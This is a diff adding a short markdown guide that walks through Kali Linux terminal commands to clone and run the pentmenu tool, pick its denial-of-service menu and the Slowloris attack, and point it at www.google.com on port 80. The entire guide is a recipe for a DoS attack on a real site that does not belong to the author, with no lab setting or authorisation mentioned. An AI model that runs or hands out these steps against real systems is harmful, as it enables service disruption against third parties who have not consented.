@@ -1,0 +1,28 @@
+**Commands that you have to write on kali linux terminal**
+
+Cd Desktop/
+
+Git clone https://github.com/GinjaChris/pentmenu
+
+cd pentmenu
+
+./pentmenu
+
+**Now type 2 for select DOS**
+
+2
+
+**Now type 9 for select Slowris**
+
+9
+
+**Enter target**
+
+www.google.com
+
+**Target Port**
+
+80
+
+ **Use SSL/TLS?[y]yes or [n]No**
+n
